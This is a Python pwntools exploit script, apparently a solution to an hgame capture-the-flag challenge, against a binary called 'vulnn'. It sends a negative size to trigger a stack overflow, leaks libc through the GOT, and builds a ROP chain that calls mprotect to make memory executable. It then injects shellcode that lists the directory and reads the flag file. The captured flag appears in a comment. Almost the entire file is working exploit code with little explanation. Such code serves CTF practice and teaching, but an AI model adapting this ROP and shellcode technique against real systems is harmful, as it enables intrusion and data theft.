#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']


# p = remote('chuj.top', '42614')
p = process('./vulnn')
elf = ELF('./vulnn')
libc = ELF("./libc-2.31.so")

def debug():
    gdb.attach(p)
    pause()

p.recvuntil('size?\n')
p.send('-1')

read_got = elf.got['read']
read_plt = elf.plt['read']
write_plt = elf.plt['write']
write_got = elf.got['write']

p.recvuntil('content?\n')
rdi_addr = 0x401443
rsi_r15_addr = 0x401441
ret_addr = 0x40101a

payload = b'a'*40 + p64(0) + p64(0) + p64(rsi_r15_addr) + p64(read_got) + p64(0) + p64(write_plt) + p64(0x401311)

p.sendline(payload)

read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('read_addr: ' + hex(read_addr))

libc.address = read_addr-libc.symbols['read']
log.success('libc.address: ' + hex(libc.address))

# shellcode='''
#     xor rax, rax
#     xor rdi, rdi
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 2
#     mov rdi, 0x67616c662f
#     push rdi
#     mov rdi, rsp
#     syscall
#
#     mov rdx, 0x100
#     mov rsi, rdi
#     mov rdi, rax
#     mov rax, 0
#     syscall
#
#     mov rdi, 1
#     mov rax, 1
#     syscall
# '''
bss = 0x404060
bss_move = 0x404060 + 0x500

shellcode = shellcraft.open('.')
shellcode += shellcraft.getdents64(3,bss+0x450,0x500)
shellcode += shellcraft.write(1,bss+0x450,0x500)

shellcode += shellcraft.read("0",0x404060 + 0x500,0x30)

shellcode += shellcraft.open(0x404060 + 0x500)
shellcode += shellcraft.read("rax","rsp",0x60)
shellcode += shellcraft.write(1,"rsp",0x60)

# shellcode += shellcraft.open("./flag40f260ee3b848928ce89")
# shellcode += shellcraft.getdents("rax","rsp",0x300)
# shellcode += shellcraft.write(1,"rsp",0x300)


#
# shellcode += shellcraft.open("./flag.txt")
# shellcode += shellcraft.read("rax","rsp",0x30)
# shellcode += shellcraft.write(1,"rsp",0x30)
sleep(1)
p.recvuntil('size?\n')

p.sendline('-1')
open_addr = libc.symbols['open']
read_addr = libc.symbols['read']
write_addr = libc.symbols['write']
printf_addr = libc.symbols['printf']
syscall_addr = 0x2584d + libc.address
getdents64_addr = libc.symbols['getdents64']
mprotect_addr = libc.symbols['mprotect']

rdx_r12_addr = 0x11c371 + libc.address
rsi_addr = 0x27529 + libc.address
rax_addr = 0x4a550 + libc.address
leave_ret_addr = 0x4012c8

# shellcode = shellcraft.open('flag')
# shellcode += shellcraft.read('rax','rsp', 0x100)
# shellcode += shellcraft.write(1, 'rsp', 0x100)
stack_addr = read_addr + 0x66F8FCAED0

payload = b'a'*40 + p64(0) + p64(bss)
payload += p64(rdi_addr) + p64(0x404000) + p64(rsi_addr) + p64(0x1000) + p64(rdx_r12_addr) + p64(7) + p64(0) + p64(mprotect_addr)
payload += p64(rdi_addr) + p64(0) + p64(rdx_r12_addr) + p64(0x1000) + p64(0) + p64(rsi_addr) + p64(bss+0x8) + p64(read_addr)
payload += p64(leave_ret_addr)
debug()
p.sendline(payload)
sleep(1)
p.send(p64(bss+0x10)+asm(shellcode))
sleep(1)
a = p.recvuntil(b'vuln')[178+0:178+24]
p.send(b'./'+a)
p.interactive()

# hgame{1-4dm1T~The-rop-ChA!N-M4YBE~TOoO0oooO0-l0Ng_And~$Orry_fOR_ThE~|Nc0NVenIENCE:(}

# payload += p64(rdi_a
# payload += p64(rdi_addr) + p64(0) + p64(rdx_r12_addr) + p64(0x20) + p64(0) + p64(rsi_addr) + p64(bss) + p64(read_addr)
# payload += p64(rdi_addr) + p64(bss) + p64(rdx_r12_addr) + p64(0) + p64(0) + p64(rsi_addr) + p64(0x10000) + p64(rax_addr) + p64(2) + p64(ret_addr) +p64(syscall_addr)
# payload += p64(rdi_addr) + p64(3) + p64(rdx_r12_addr) + p64(0x300) + p64(0) + p64(rsi_addr) + p64(bss) + p64(getdents64_addr)
# payload += p64(rdi_addr) + p64(1) + p64(write_addr)

# 0x7f958df85130
# 0x7ffc86f50000
# 0x66F8FCAED0

